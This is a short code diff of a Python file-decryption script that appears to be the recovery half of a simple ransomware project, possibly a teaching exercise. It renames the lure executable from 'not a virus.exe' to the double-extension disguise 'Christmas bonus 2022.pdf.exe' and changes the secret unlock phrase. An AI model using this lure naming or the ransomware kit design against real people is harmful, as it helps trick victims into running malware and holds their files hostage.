@@ -7,15 +7,14 @@ files = [] #empty list for all of the found files
 
 
 for file in os.listdir():
-    if file == "not a virus.exe" or file =="82926249564354929" or file =="decryption.exe":
+    if file == "Christmas bonus 2022.pdf.exe" or file =="82926249564354929" or file =="decryption.exe":
         continue
     if os.path.isfile(file): #adds all the files found to our list
         files.append(file)
-secretphrase = "cat"
+secretphrase = "sikkerhed er godt"
 
 user_prase = input("Enter the secret phrase to decrypt your files:   ")
 if user_prase == secretphrase:
-    print(files)
     with open("82926249564354929", "rb") as key:
         secretkey = key.read()
 
@@ -34,5 +33,3 @@ if user_prase == secretphrase:
 
 else:
     print("WRONG")
-
-
